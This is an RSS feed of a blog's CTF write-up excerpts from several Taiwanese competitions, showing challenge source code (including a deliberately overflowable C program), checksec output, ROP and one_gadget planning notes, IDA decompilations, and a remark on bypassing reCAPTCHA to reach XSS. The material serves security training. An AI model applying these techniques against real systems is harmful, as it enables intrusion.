<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Site</title><link>https://bernie6401.github.io/docs/security/competition/</link><description>Recent content on SBK Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/competition/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 EOF 2023 初賽</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="ais3-eof-2023-初賽">
 AIS3 EOF 2023 初賽
 &lt;a class="anchor" href="#ais3-eof-2023-%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;h2 id="pwn">
 PWN
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="real_rop">
 real_rop
 &lt;a class="anchor" href="#real_rop">#&lt;/a>
&lt;/h3>
&lt;h4 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>Challenge &lt;a href="https://share.ctf.zoolab.org/">URL&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Folder structure:&lt;/p>
&lt;pre tabindex="0">&lt;code>Share
├── share
│ ├── chal
│ ├── flag
│ ├── Makefile
│ ├── real_rop++.c
│ └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h4>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];

 read(0, buf, 0x30);
 write(1, buf, 0x30);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-make!" data-lang="make!">gcc -fno-stack-protector -o chal real_rop++.c
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Obviously buffer overflow but not much&lt;/li>
&lt;li>Preliminary idea is &lt;code>one_gadget&lt;/code>&lt;/li>
&lt;li>Check protector
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: PIE enabled
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;code>PIE&lt;/code> is enabled → use write function to leak &lt;code>libc&lt;/code> address&lt;/li>
&lt;li>&lt;code>Full RELRO&lt;/code> → cannot use &lt;code>GOT hijacking&lt;/code>&lt;/li>
&lt;li>Refer to &lt;a href="https://hackmd.io/Prmz9YuOQsiHGXrTuYMzFw?view#Real_rop">大神write up&lt;/a>, we cannot leak &lt;code>libc&lt;/code> address and get shell at one time. So, we can control &lt;code>$rip&lt;/code> and return to the beginning of &lt;code>main&lt;/code> function and go through the process again. That is, &lt;font color="FF0000">we have another &lt;code>read&lt;/code> function&lt;/font> to fill in &lt;code>one_gadget&lt;/code>.&lt;/li>
&lt;li>Note that, &lt;strong>the version of Ubuntu and Glibc is VERY VERY important&lt;/strong>, according to &lt;code>Dockerfile&lt;/code>, it seems use Ubuntu 20.04 with default
&lt;pre tabindex="0">&lt;code class="language-dockerfile!" data-lang="dockerfile!">FROM ubuntu:20.04
MAINTAINER u1f383

RUN apt-get update &amp;amp;&amp;amp; \
 DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd

RUN useradd -m chal
RUN chown -R root:root /home/chal
RUN chmod -R 755 /home/chal

CMD [&amp;#34;/usr/sbin/xinetd&amp;#34;, &amp;#34;-dontfork&amp;#34;]
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="analyze-where-to-return">
 Analyze where to return
 &lt;a class="anchor" href="#analyze-where-to-return">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;font color="FF0000">&lt;strong>&lt;code>For Ubuntu 22.04 &amp;amp;　GLIBC 2.35&lt;/code> - back to &lt;code>__libc_start_main+121&lt;/code>&lt;/strong>&lt;/font>&lt;/p></description></item><item><title>AIS3 EOF 2024</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</guid><description>&lt;h1 id="ais3-eof-2024">
 AIS3 EOF 2024
 &lt;a class="anchor" href="#ais3-eof-2024">#&lt;/a>
&lt;/h1>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkNtOJddp.png" alt="圖片" />&lt;/p>
&lt;h2 id="crypto">
 Crypto
 &lt;a class="anchor" href="#crypto">#&lt;/a>
&lt;/h2>
&lt;h3 id="baby-rsa">
 Baby RSA
 &lt;a class="anchor" href="#baby-rsa">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, long_to_bytes, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(m, e, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enc &lt;span style="color:#f92672">=&lt;/span> pow(bytes_to_long(m), e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> enc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(c, d, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dec &lt;span style="color:#f92672">=&lt;/span> pow(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> long_to_bytes(dec)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> q &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">=&lt;/span> p &lt;span style="color:#f92672">*&lt;/span> q
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> phi &lt;span style="color:#f92672">=&lt;/span> (p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (q &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> phi &lt;span style="color:#f92672">%&lt;/span> e &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> : 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> d &lt;span style="color:#f92672">=&lt;/span> pow(e, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, phi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>p&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>q&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>n&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;FLAG: &amp;#34;&lt;/span>, encrypt(FLAG, e, n))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">3&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;Any message for me?&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m &lt;span style="color:#f92672">=&lt;/span> decrypt(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;How beautiful the message is, it makes me want to destroy it .w.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> new_m &lt;span style="color:#f92672">=&lt;/span> long_to_bytes(bytes_to_long(m) &lt;span style="color:#f92672">^&lt;/span> bytes_to_long(os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">8&lt;/span>)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print( &lt;span style="color:#e6db74">&amp;#34;New Message: &amp;#34;&lt;/span>, encrypt(new_m, e, n) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;?&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>AIS3 Pre-Exam 2023</title><link>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</guid><description>&lt;h1 id="ais3-pre-exam-2023">
 AIS3 Pre-Exam 2023
 &lt;a class="anchor" href="#ais3-pre-exam-2023">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-eof2023">
 tags: &lt;code>CTF&lt;/code> &lt;code>EOF2023&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-eof2023">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="web">
 Web
 &lt;a class="anchor" href="#web">#&lt;/a>
&lt;/h2>
&lt;h3 id="e-portfolio-baby">
 E-Portfolio baby
 &lt;a class="anchor" href="#e-portfolio-baby">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS&lt;/p>
&lt;h3 id="login-panel">
 Login Panel
 &lt;a class="anchor" href="#login-panel">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-1">
 Recon
 &lt;a class="anchor" href="#recon-1">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;a href="https://www.readfog.com/a/1640970212456108032">我又找到了一個破解谷歌驗證碼的新方案！&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://yescaptcha.com/dashboard.html">yescaptcha&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h2 id="pwn">
 Pwn
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="simply-pwn">
 Simply Pwn
 &lt;a class="anchor" href="#simply-pwn">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-2">
 Recon
 &lt;a class="anchor" href="#recon-2">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>&lt;code>checksec&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec pwn
[*] Checking for new versions of pwntools
 To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to &amp;#39;never&amp;#39; (old way).
 Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
 [update]
 interval=never
[*] You have the latest version of Pwntools (4.9.0)
[*] &amp;#39;/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX disabled
 PIE: No PIE (0x400000)
 RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="misc">
 Misc
 &lt;a class="anchor" href="#misc">#&lt;/a>
&lt;/h2>
&lt;h3 id="welcome">
 Welcome
 &lt;a class="anchor" href="#welcome">#&lt;/a>
&lt;/h3>
&lt;p>縮小檔案就看的到flag了
Flag: &lt;code>AIS3{WELCOME-TO-2023-PRE-EXAM-&amp;amp;-MY-FIRST-CTF}&lt;/code>&lt;/p></description></item><item><title>BalsnCTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/balsnctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/balsnctf-2023/</guid><description>&lt;h1 id="balsnctf-2023">
 BalsnCTF 2023
 &lt;a class="anchor" href="#balsnctf-2023">#&lt;/a>
&lt;/h1>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h3 id="lucky">
 Lucky
 &lt;a class="anchor" href="#lucky">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">__int64 main_fn()
{
 __int64 idx; // r15
 int v1; // ebp
 __int64 v2; // rbx
 unsigned __int64 v3; // r14
 int v4; // r9d
 int v5; // r9d
 char v6; // al
 __int64 v7; // rdx
 unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF
 char v10[32]; // [rsp+10h] [rbp-98h] BYREF
 __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF
 __int64 v12; // [rsp+50h] [rbp-58h]
 char v13; // [rsp+58h] [rbp-50h]
 unsigned __int64 v14; // [rsp+68h] [rbp-40h]

 idx = 10000000000000000LL;
 v1 = 0;
 v14 = __readfsqword(0x28u);
 v2 = sub_40C2B0(&amp;#34;/dev/urandom&amp;#34;, &amp;amp;unk_498004);
 do
 {
 sub_40C3B0(&amp;amp;v9, 4uLL, 1LL, v2);
 v3 = v9 % 100000000uLL;
 sub_40C3B0(&amp;amp;v9, 4uLL, 1LL, v2);
 v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) &amp;gt; 9999999999999999LL) - 1;
 --idx;
 }
 while ( idx );
 sub_44A050(v10, 1u, 30LL, &amp;#34;%lu&amp;#34;, 4 * v1 - 0x4F430000, v4);
 v13 = 0;
 v6 = 0x73;
 v12 = 0LL;
 memset(user_input, 0, sizeof(user_input));
 while ( 1 )
 {
 v7 = idx &amp;amp; 0xF;
 *(user_input + idx++) = v10[v7] ^ v6;
 if ( idx == 40 )
 break;
 v6 = byte_498040[idx];
 }
 if ( LOBYTE(user_input[0]) == &amp;#39;B&amp;#39; &amp;amp;&amp;amp; *(user_input + 1) == &amp;#39;NSLA&amp;#39; &amp;amp;&amp;amp; BYTE5(user_input[0]) == &amp;#39;{&amp;#39; &amp;amp;&amp;amp; HIBYTE(v12) == &amp;#39;}&amp;#39; )
 sub_44A130(1, &amp;#34;Lucky! flag is %s\n&amp;#34;, user_input, byte_498040, user_input, v5);
 else
 (sub_40C4B0)(&amp;#34;Not so lucky ...&amp;#34;, 1LL, v7, byte_498040, user_input);
 if ( v14 != __readfsqword(0x28u) )
 (sub_44A220)();
 return 0LL;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>CGGC 2023 初賽</title><link>https://bernie6401.github.io/docs/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="cggc-2023-初賽">
 CGGC 2023 初賽
 &lt;a class="anchor" href="#cggc-2023-%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>隊名: 王凡補習班&lt;/li>
&lt;li>名次
&lt;img src="https://hackmd.io/_uploads/ryb_H_FrT.png" alt="圖片" />
這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的&lt;/li>
&lt;/ul>
&lt;h2 id="gaoyi">
 GaoYi
 &lt;a class="anchor" href="#gaoyi">#&lt;/a>
&lt;/h2>
&lt;h3 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setvbuf(stdout, &lt;span style="color:#ae81ff">0LL&lt;/span>, &lt;span style="color:#ae81ff">2LL&lt;/span>, &lt;span style="color:#ae81ff">0LL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(TITLE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Welcome to the Charitable Lag Vegas!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Anyone can participate with three million US dollars.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Game 1: Predict the first 8 cards I draw in exact order.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Input example: &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">C8&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;Card %c: &amp;#34;&lt;/span>, i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">49&lt;/span>, v3, v4, v5, v6, flag[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i], &lt;span style="color:#ae81ff">32LL&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)isACard((&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i]) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>v47;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)j_strlen_ifunc(&lt;span style="color:#f92672">&amp;amp;&lt;/span>input[&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">*&lt;/span> j]) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">224&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>j &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> v8 &lt;span style="color:#f92672">+&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">32&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v10 &lt;span style="color:#f92672">+&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>j &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> v12 &lt;span style="color:#f92672">+&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">33&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> v14 &lt;span style="color:#f92672">+&lt;/span> v13;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">129&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;7&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> v16 &lt;span style="color:#f92672">+&lt;/span> v15;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v18 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">64&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;C&amp;#39;&lt;/span>;
